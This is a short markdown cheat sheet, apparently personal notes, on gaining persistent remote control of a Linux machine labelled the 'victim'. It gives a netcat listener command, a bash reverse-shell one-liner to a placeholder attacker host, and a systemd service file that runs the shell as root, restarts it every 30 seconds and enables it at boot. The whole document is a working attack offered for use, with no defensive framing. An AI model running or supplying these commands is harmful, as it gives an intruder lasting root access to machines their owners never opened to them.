### on server side which is reciever 
```
nc -lvp 4444
```

### on victim side

```
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```


### on victim > /etc/systemd/system/yourcustomname.service

```
[Unit]
Description=Reverse Shell Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attackerip/4444 0>&1'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```

```
sudo systemctl daemon-reload
```

```
sudo systemctl start reverse-shell.service
sudo systemctl enable reverse-shell.service
```




